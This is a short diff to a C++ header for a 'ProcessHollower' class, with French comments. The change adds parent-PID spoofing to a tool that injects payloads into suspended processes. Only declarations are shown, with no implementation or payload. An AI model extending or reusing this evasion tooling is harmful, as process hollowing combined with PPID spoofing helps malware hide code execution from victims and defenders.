@@ -25,16 +25,19 @@ private:
     HANDLE hProcess = nullptr;
     HANDLE hThread = nullptr;
     DWORD processId = 0;
+    DWORD parent_pid = 0;  // PPID à spoofier (0 = pas de spoof)
     bool verbose = false;
 
     bool create_suspended_process(const wchar_t* target_path);
 
 public:
-    ProcessHollower(bool verbose_mode = false) : verbose(verbose_mode) {}
+    ProcessHollower(bool verbose_mode = false, DWORD ppid = 0) : verbose(verbose_mode), parent_pid(ppid) {}
     ~ProcessHollower();
 
     // Hollowing: create suspended + PE entry point injection
     bool HollowProcess(const wchar_t* target_exe, const std::vector<uint8_t>& payload);
+
+    void SetParentPID(DWORD ppid) { parent_pid = ppid; }
 
     bool IsValid() const { return hProcess && hProcess != INVALID_HANDLE_VALUE; }
 };
